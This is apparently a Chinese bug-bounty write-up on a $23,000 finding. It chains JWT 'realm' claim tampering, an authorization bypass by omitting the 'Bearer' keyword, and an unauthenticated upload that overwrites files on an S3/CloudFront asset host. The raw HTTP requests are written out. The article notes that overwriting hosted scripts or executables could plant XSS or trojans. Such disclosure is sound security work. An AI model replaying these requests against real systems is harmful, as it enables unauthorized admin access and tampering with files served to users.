---
title: 得到$23000赏金的挖漏洞过程
url: https://mp.weixin.qq.com/s/bmxXGrXQYGO0Y6Z8Ff8GuQ
source: Doonsec's feed
date: 2026-07-08
fetch_date: 2026-07-09T05:59:57.885077
---

# 得到$23000赏金的挖漏洞过程

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6NOwiaN0uCuOChonv3pt1HedRjleYNBia0uHjK9T8iaQNUSwO1kXxhiatvpqric6q5rRwqdZ3ymUP6UHsyuZ1Lqibpck0QWzqic7ou4fA/0?wx_fmt=jpeg)

# 得到$23000赏金的挖漏洞过程

原创

杜明
杜明

黑白之道

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6PEtrnib92D2oK87RibXnQvpZCZAkK3atZrcptiahK7489EsepicU8jY03gBQqJmM9H50cKQRKIY72vFj6hjQLAHDmMSOQic6mQ150A/640?wx_fmt=png)
> **导语**：本文分享了一起通过JWT认证机制缺陷配合文件上传功能，最终实现任意文件覆写的完整攻击链。该漏洞为研究者带来了总计23000美元的赏金，其中任意文件覆写单项获得20000美元。

---

## 一、背景

目标站点使用 **JSON Web Token（JWT）** 作为认证机制。用户登录主站后会获得一个普通用户的JWT令牌。

通过对目标进行详细侦察（包括JavaScript文件分析、Burp Suite抓包、 Wayback Machine历史端点收集以及子域名枚举），我发现了一个管理后台子域名 `admin.test.com`。

阅读后台的 `app.js` 文件（约20万行代码）后，确认其使用JWT认证，并发现了一个名为 `test-dashboard` 的realm（认证域）。

## 二、认证绕过（JWT Realm篡改）

### 2.1 原理

在 jwt.io 解码普通用户令牌后，发现其中包含 `realm=test-user` 字段。由于服务端仅验证JWT签名是否有效，未对realm进行严格校验，我尝试将realm值修改为 `test-dashboard`。

### 2.2 利用步骤

1. 登录主站 `test.com` 获取普通用户JWT
2. 拦截登录API请求 `/api/v1/login`，修改请求体中的realm值

**构造请求：**

```
POST /api/v1/login HTTP/1.1
Host: accounts.test.com
Content-Type: application/json

{"email":"youremail@gmail.com","password":"<password>","realm":"test-dashboard"}
```

![JWT realm篡改对比](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6NiczVqUxfia0D6CicNU2YytAwM6BBVq9bm9JficBFSSOJibyfibneuAlavzF5Oia3vStY3es5eO0ATk5wYnM95WcKhFvVUKyujlNdryQ/640?wx_fmt=jpeg "JWT realm篡改对比")

解码修改后的JWT，可见realm已被成功篡改为 `test-dashboard`：

![JWT解码结果](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6O588bhibibD0v4OMH9NKe8TGVLpAq9e8l1uKLbPp2JhnjKSM4S7EMvPuXz7OgEFTYj68oTghjG3IZnnSOt3KPbt2RRibpbgJLj0c/640?wx_fmt=jpeg "JWT解码结果")

使用篡改后的JWT令牌，成功登录管理后台。但厂商认为管理后台仅为前端React应用，实际API有独立认证，因此将漏洞等级从严重降至中危：

![厂商反馈](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6PTogH0icxTA2gSQwcXicibeCf7CtO4UubfNgkfA7sGpGsOXYsQ99PBanTDv6amvvOVMH6XoiaNDMNdeNiaHjh87l213JiaiaWEYW5e9M/640?wx_fmt=png "厂商反馈")

## 三、授权头绕过（Bearer关键字删除）

### 3.1 Fuzzing发现

为提升漏洞严重程度，我继续深入分析。由于已能控制JWT中的realm，需找到能操作API的方式。

对管理后台 `/upload` 接口进行 fuzzing 测试。默认情况下ffuf使用GET方法，切换为POST后发现了该上传接口。

### 3.2 关键发现

在Fuzzing **Authorization: Bearer <JWT>** 时，删除 `Bearer` 关键字后收到200响应。

**构造请求（删除Bearer）：**

```
POST /upload HTTP/1.1
Host: admin.test.com
Authorization: <JWT>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypxxxxxx

------WebKitFormBoundarypxxxxxx
Content-Disposition: form-data; name="destination"gallery/
------WebKitFormBoundarypxxxxxx
Content-Disposition: form-data; name="file"; filename="poc.txt"
Content-Type: Text/plainh4x0r-dz POC
------WebKitFormBoundarypxxxxxx--
```

成功获得上传响应：

![文件上传成功](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6NJn506qicHoKhiaopSHah1UaWAd5YhDMMnqWE4JSxhYznjGKfPAQ6UPYEN5D4kBDlFP4RVCrGOcVm0FKxIAFqZVobRsibictBxBEo/640?wx_fmt=jpeg "文件上传成功")

## 四、文件路径发现

上传成功后面临新问题：如何找到文件存储路径？

通过分析Burp Suite历史记录和响应头，发现返回的href指向：`https://xxxxxxxx.cloudfront.net/gallery/xxxxxxxxx`

其中 `gallery` 与上传请求中 `destination` 参数值相同。访问 `https://XXXXXXXXX.cloudfront.net/gallery/poc.txt` 确认文件可被访问。

由于上传功能托管于Amazon CloudFront CDN，无法直接上传WebShell，单独报告此漏洞严重程度较低。

## 五、任意文件覆写（Arbitrary File Overwrite）

### 5.1 漏洞原理

Amazon S3在默认配置下存在**任意文件覆写**风险。当S3桶允许上传已有文件名时，攻击者可覆盖关键文件。

分析发现 `xxxxxxxx.cloudfront.net` 用于托管主站的JavaScript、HTML、Windows软件及PDF文件。这意味着我可以修改这些文件内容。

### 5.2 攻击利用

主站通过CloudFront CDN加载资源文件。攻击者可利用任意文件覆写：

* 修改JavaScript文件，插入恶意代码实现存储型XSS
* 篡改可执行文件（.exe）或PDF，植入木马控制用户主机

![CloudFront托管文件](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6MQgzDEfUjuqCNUZhJ6scfeurLNPjYo8qUVPicUQVIOfEf2QfZPia6nwgOjnTm1KKNzRkO1nGHampNk8yqGXCT10xENYvzrSYKRc/640?wx_fmt=jpeg "CloudFront托管文件")

初始POC文件内容：

![初始POC](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6OMMCpdnM4W3Dao08ibkCAWRDLlh93adSCQcZxOxcbWlAhjWwvTRFQSWxkJqkMkHjHxibtm04pn27M8bMicficmsX2XSicZXSWtymt4/640?wx_fmt=jpeg "初始POC")

通过以下请求覆写 `poc.txt` 内容为 "Arbitrary File Overwrite"：

```
POST /upload HTTP/1.1
Host: admin.test.com
Authorization: <JWT>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypxxxxxx

------WebKitFormBoundarypxxxxxx
Content-Disposition: form-data; name="destination"gallery/
------WebKitFormBoundarypxxxxxx
Content-Disposition: form-data; name="file"; filename="poc.txt"
Content-Type: Text/plainArbitrary File Overwrite
------WebKitFormBoundarypxxxxxx--
```

![文件覆写成功](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6O6U6GAcAA6ARC57RHibk2As4iasAczxADsYnVqJia99TnbvawvKBH28VnAqvnTHEMXZnNPcLq9pwtFajGqo0rswdFX7t6PRus7jc/640?wx_fmt=jpeg "文件覆写成功")

命令行验证确认文件内容已被成功覆写：

![命令行验证](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6MQicuFARXfgZOmiaujQn9b6sl2iaVg1diazMdw5ZviaQNPPibb2sIrUHKQmpbQQ2v5Dd4hK2IcSicXdf7kbEJnVo6Ov578VtiaDF9vFrg/640?wx_fmt=jpeg "命令行验证")

## 六、漏洞总结与赏金

| 漏洞类型 | 赏金金额 |
| --- | --- |
| 管理后台UI访问（JWT realm篡改） | $3,000 |
| 任意文件覆写 | $20,000 |
| **总计** | **$23,000** |

![最终赏金](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6N6RqricFT0XX10nbricMWmzLTdHteU02pZzFfhMNL9MrByuFSsLeRicUzBT3N0PLsEUKAJ8OnicT9pcGWGaLczHo4byszNibicibAyBE/640?wx_fmt=jpeg "最终赏金")

---

## 七、关键发现

* **JWT realm字段可被篡改**：部分应用仅验证JWT签名，不校验claim值的合法性
* **Authorization头Bearer关键字可省略**：部分服务端对认证头格式校验不严格
* **S3/CloudFront默认配置存在文件覆写风险**：即使无法上传WebShell，通过覆写现有资源文件同样可造成严重危害
* **Fuzzing是挖掘此类漏洞的关键手段**：本文中删除"Bearer"关键字的发现即源于系统化fuzzing测试

**版权声明**：本文由华盟网原创发布，保留所有权利。配图由华盟网授权使用。

---

![](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6Puc8HNiaVFMibMWyXuRCjam9iat0x1rCpsp1iatD7HveaKn7X0FMG8AlYEYZQbWQjAzjbYJjgdDQYTxLsn3W66vehH9V8LV2z9XnE/640?wx_fmt=jpeg)

[![](https://mmbiz.qpic.cn/mmbiz_png/nGzNudUIJ6NJaWlOgGNt6DbZUibIWJ1CIhPX5Be64ePAYnHxT3Q4ThVqTKzMNiaQAYEjNaDlY9AthbLcIsrN4kPU1dqTEyiaAr3nialmYqMQh9o/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650618755&idx=1&sn=48e0a85464fb20c73b6f338928a8f850&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/nGzNudUIJ6PKBzibJnbda0CMK3x60eudMe9sX2keic0hP6ibj4r1vchm8wLibbC2LvvlTBXKJbfDqhJQQKCpqDeWnsEoxndVribgNu4ZZGlZ5KEw/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650618776&idx=2&sn=a8fc65fd2a71822830022fc52d967bcd&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/nGzNudUIJ6M31JAE8U9E4F6SwkHX5V8dmziavPTqVQc7JdOHLa6PRExE28VUOIRk770kATgFwwvMibngxp6OBwXhjHATN3lVheGl5dVrSiaVa4/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650618496&idx=1&sn=96ecdff99136258a4bf2cb156542311e&scene=21#wechat_redirect)

> 👇 点击**阅读原文**，访问我的网站

---

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicpdp8GZxicJpcFIZglvakzYRZiaqt6W61hfgibjeymOgiaGqRsgNvgWIacMj7Gk4PIZ4o2NtW1zb9P6Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过